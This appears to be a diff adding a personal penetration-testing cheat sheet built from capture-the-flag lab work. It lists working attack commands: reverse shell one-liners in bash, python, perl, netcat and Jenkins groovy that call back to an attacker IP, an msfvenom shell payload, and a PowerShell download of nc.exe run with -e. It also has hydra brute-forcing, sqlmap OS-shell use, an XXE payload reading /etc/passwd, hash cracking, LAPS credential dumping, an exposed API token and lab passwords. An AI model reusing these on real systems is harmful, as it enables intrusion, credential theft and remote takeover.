@@ -1,0 +1,297 @@
+gobuster
+usage: gobuster dir -u http://10.10.95.226 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt 
+
+directory brute-forcing using wfuzz:
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 15 http://10.10.66.89:8081/FUZZ
+
+sorting and removing reused words in a wordlist
+usage: sort fsocity.dic | uniq > fsocity-sorted.dic
+
+cracking md5 with john
+usage: john -format=raw-md5 --wordlist=/home/kali/rockyou.txt password.raw-md5
+
+cracking zip password with john
+usage: zip2john backup.zip > zip.hashes
+then: john zip.hashes
+
+cracking pfx password with john
+usage: pfx2john.py file.zip > zip.hash
+then: john --wordlist=/home/kali/Documents/wordlists/rockyou.txt zip.hash
+
+extracting private key from pfx file:
+openssl pkcs12 -in yourfile.pfx -nocerts -out drlive.key
+
+decrypting private key extracted from pfx file:
+openssl rsa -in drlive.key -out drlive-decrypted.key
+
+extracting cert from pfx file:
+openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out drlive.crt
+
+wordpress wp-admin panel password brute-forcing
+usage: wpscan --url 10.10.182.40 --wp-content-dir wp-admin --usernames elliot --passwords ~/Downloads/fsocity-sorted.dic
+
+wordpress username enumeration:
+wpscan --url http://blog.thm --enumerate u
+
+scanning wordpress for vulnerabilities using api-token:
+wpscan --url http://office.paper --api-token n2lb1bC1ravsPbdJpQ955R8lCsEb2KLaV8Qpn4W8gaI
+
+netcat reverse shell listening
+usage: nc -lvnp 4444
+
+finding SUID binary:
+usage: find / -perm -u=s -type f 2>/dev/null
+	find / -type f -perm -04000 -ls 2>/dev/null
+	
+finding capabilities for priv esc:
+usage: getcap -r / 2>/dev/null
+
+find command to find flags:
+usage: find -name flag*.txt
+
+smb login:
+check for smb shares first: smbclient -L 10.129.129.202
+then try logging in with each share: smbclient \\\\10.129.129.202\\WorkShares 
+where WorkShares is the literal share name we got from first command
+
+rdp login:
+this came in handy when ms-wbt-server service was running on a port 3389
+command: xfreerdp /v:10.129.58.221 /u:Administrator /cert:ignore
+where /v:indicates ip, /u:usernaem
+
+connecting to remote mysql db:
+usage: mysql -u root -h 10.10.203.82 -p
+
+transfering local files through ssh:
+usage: scp linpeas.sh -i id_rsa james@10.10.139.175:/home/james
+
+transfering remote files to local machine through ssh:
+usage: scp skyfuck@10.10.43.129:/home/skyfuck/tryhackme.asc /home/kali/Desktop/tryhackme/tomghost
+
+upgrading the reverse shell to proper terminal
+usage: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+one line reverse shell
+usage: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.31.103 4444 >/tmp/f
+usage: bash -c "bash -i >& /dev/tcp/10.10.14.31/444 0>&1"
+
+python simple http server
+usage: python -m Simplehttpserver
+
+python http.server
+usage: python -m http.server
+
+To send files from reverse shell to your local file system
+usage: on victim's shell write: python -m SimpleHTTPServer 8080
+then on local system: wget http://victim.ip:8080/FiletoDownload
+
+to upload a file in ftp server
+usage: put file_name
+
+to download a file from ftp server
+usage: get file_name
+
+python reverse shell one liner:
+usage: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.31.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+brute-forcing web login page using hydra:
+usage: hydra -l rcampbell -P /home/kali/Downloads/rockyou.txt 10.10.130.20 http-post-form "/api/login:username=rcampbell&password=^PASS^:Incorrect Credentials"
+
+brute-forcing ftp password with hydra:
+usage: hydra -l ftpuser -P wordlist.txt -t4 ftp://10.10.86.197 -vv
+
+brute-forcing ssh password with hydra:
+usage: hydra -l john -P /home/kali/Desktop/tryhackme/GamingServer/dict.lst ssh://10.10.127.1
+
+cracking ssh private key passphrase: 
+usage: ssh2john id_rsa > id_rsa.hash
+	john --wordlist=/home/kali/Downloads/rockyou.txt id_rsa.hash
+	
+adding new hostname to /etc/hosts file:
+usage: echo "10.10.151.106 mafialive.thm" | sudo tee -a /etc/hosts 
+
+printing all users name from /etc/passwd file:
+usage: cat /etc/passwd | cut -d ":" -f 1
+
+grepping real users from /etc/passwd file:
+usage: cat /etc/passwd | grep home
+
+subdomain enumeration:
+wfuzz: wfuzz -c -f sub-fighter -w /home/kali/Downloads/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://horizontall.htb' -H "Host: FUZZ.horizontall.htb" --sc 200
+
+forwarding a port from attacker machine
+on victim machine: chisel server -p 6004 --reverse &
+on attacker's machine: ./chisel client 10.10.14.10:6004 R:6001:127.0.0.1:8000
+where 8000 is the port we want to forward, 6004 is the port we are receiving the incoming connection, 6001 is the port which will run the forwarded port on our machine.
+
+sqlmap usage POST Req: sqlmap -u "http://10.129.244.176/index.php" --data="username=saad&password=saad"
+	     GET Req:  sqlmap -u "http://10.129.39.247/dashboard.php?search=meta"
+	     OS Shell: sqlmap -u "http://10.129.39.247/dashboard.php?search=meta" --os-shell --flush-session
+	     
+	    
+XXE Payload: 
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+
+looking at the head of a hexdump of a file:
+usage: xdd filename | head
+
+decoding a hex string:
+usage : echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
+
+useful sqlmap commands:
+sqlmap -u "http://10.10.170.49/login/" --data="username=root&password=root&submit=submit"
+
+sqlmap -u "http://10.10.170.49/login/" --data="username=root&password=root&submit=submit" --dbs --level=5 --risk=3 --dump --batch --tamper=space2comment --threads 10 --time-sec=10
+
+sqlmap -u "http://10.10.170.49/login/" --data="username=root&password=root&submit=submit" --current-db
+
+sqlmap -u "http://10.10.170.49/login/" --data="username=root&password=root&submit=submit" -D THM_f0und_m3 --tables
+
+sqlmap -u "http://10.10.170.49/login/" --data="username=root&password=root&submit=submit" -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
+
+
+
+hex to text:
+echo "68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f" | xxd -r -p
+
+base64 decode:
+echo "RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==" | base64 -d
+
+base32 decode:
+echo "MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======" | base32 -d
+
+binary to text in python:
+n = "01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001"
+print("".join([chr(int(i,2)) for i in n.split(' ')]))
+
+rot13 decode:
+echo 'Ebgngr zr 13 cynprf!' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+python ascii to text:
+a = "85 110 112 97 99 107 32 116 104 105 115 32 66 67 68"
+print("".join([chr(int(i)) for i in a.split(' ')]))
+
+python bin to text:
+a="01100110 01100101 00100000 01100000 01011111 01100000 00100000 01100000 01100000 01100101 00100000 01100010 01101000 00100000 01100000 01100000 01100100 00100000 01100010 01100001 00100000 01100000 01011111 01101000 00100000 01101000 01100110 00100000 01100000 01011111 01100110 00100000 01100000 01011111 01100000 00100000 01100010 01100001 00100000 01100000 01100000 01100101 00100000 01100000 01011111 01100011 00100000 01100000 01011111 01100100 00100000 01100000 01100000 01100100 00100000 01100010 01100001 00100000 01101000 01100110 00100000 01100010 01100001 00100000 01101000 01100111 00100000 01100000 01011111 01100100 00100000 01100000 01100000 01100101 00100000 01100010 01100001 00100000 01100000 01100000 01100101 00100000 01100000 01100000 01100011 00100000 01100000 01011111 01100100 00100000 01101000 01101000 00100000 01100000 01011111 01100110 00100000 01100000 01011111 01100100 00100000 01100000 01011111 01100000 00100000 01100000 01100000 01100011 00100000 01100011 01100101 00100000 01100011 01100101 00100000 01100011 01100101"
+print("".join([chr(int(i,2)) for i in a.split(' ')]))
+
+
+victim machine port forward using ssh tunneling:
+ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm
+where: 6767 is the port that will be running on our attack machine and 8080 is the port of victim machine which we're forwarding.
+
+jenkins groovy script for reverse shell:
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.4.31.103/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+brute-forcing jenkins admin password using hydra:
+hydra -f -l admin -P /home/kali/Downloads/rockyou.txt -s 6767 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+
+msfvenom windows aspx reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='my-own-ip' LPORT=4444 -f aspx > rev.aspx
+
+transfer files from local to remote windows machine:
+on powershell cmd: Invoke-WebRequest http://10.4.31.103/Invoke-PowerShellTcp.ps1 -outfile rshell.ps1
+
+rdp using rdesktop:
+rdesktop -u SG 10.10.4.253
+
+priv-esc vector:
+write id command and check if you are in docker group then gtfobins docker to get root shell
+
+brute-forcing wp-admin password using hydra:
+hydra -l bjoel -P ~/Documents/wordlists/rockyou.txt 10.10.189.221 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -vV -f
+
+
+python3 hex decode:
+bytes.fromhex('313333375f707764').decode('utf-8')
+
+python3 hex to dec:
+a='7a69'
+dec = int(a, 16)
+print(dec)
+
+metasploit pop3 login brute-force:
+module name: auxiliary/scanner/pop3/pop3_login
+
+
+useful git commands:
+to show the commit history logs in .git repo: git log
+to show the commit value of respective commit: git show 395e087334d613d5e423cdf8f7be27196a360459
+
+connecting as Administrator if the user's Local Group Membership: *Administrators:
+python3 psexec.py 10.10.216.20/achilles:winniethepooh@10.10.216.20
+
+remote cmd connection in windows using evil-winrm:
+evil-winrm -i 10.10.216.20 -u achilles -p winniethepooh
+
+injecting a remote shell to windows machine:
+powershell curl 10.4.31.103:8000/nc.exe -o nc.exe
+
+executing that remote shell
+nc.exe 10.4.31.103 9001 -e powershell
+
+cracking linux shadow file password using hashcat:
+hashcat -m 1800 -a 0 shadow.hash /home/kali/Documents/wordlists/rockyou.txt
+
+web parameter fuzzing:
+ffuf -w /home/kali/Documents/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://mercury.picoctf.net:21939/index.php?FUZZ=' -fw 9
+
+generating new ssh public private key pairs:
+ssh-keygen -t rsa
+
+decrypting gpg with a key:
+gpg --import name.key
+gpg -d file.gpg
+
+python3 removing everything before a specific string:
+re.sub(r'^.*?0x', '', i)
+
+curl request with url encoded parameters:
+curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.31/4444 0>&1"'
+
+to check the routing table in linux:
+command: route
+
+to add a new entry in the routing table:
+ip route add 192.168.222.0/24 via 10.175.34.1
+usage: ip route add <network_ip>/<cidr> via <gateway_ip>
+
+privesc using a session screen running as root:
+export TERM=xterm
+screen -x root/root
+
+using evil-winrm to login to windows using username, private key and certificate:
+evil-winrm -i 10.129.155.150 -u legacyy -c drlive.crt -k out2-decrypted.key -S
+
+Powershell alternative to linux head command:
+gc log.txt | select -first 10 
+
+Powershell finding a file in the entire file system:
+Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
+
+Dumping LAPS Credentials using crackmapexec (This was useful when the user was part of LAPS_Readers group)
+crackmapexec ldap 10.129.155.150 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.129.155.150 -M laps
+
+snmp enumeration:
+snmpenum 10.10.11.136 public linux.txt
+snmpwalk -c public -v2c -On 10.10.11.136 
+
+virtual host or subdomain fuzzing:
+wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb 
+
+perl reverse shell one liner:
+perl -e 'use Socket;$i="10.4.31.103";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+python coversions:
+int to hex: hex(integer_value)
+hex to int: int(hex_value, 16)
+bytes to hex: bytes.fromhex(hex_value)
+hex to bytes: bytes_value.hex()
+
+decrypting rsa with weak public key (when public key and encrypted text is given):
+python3 RsaCtfTool.py --publickey /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/key.pub --uncipherfile /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/flag.enc
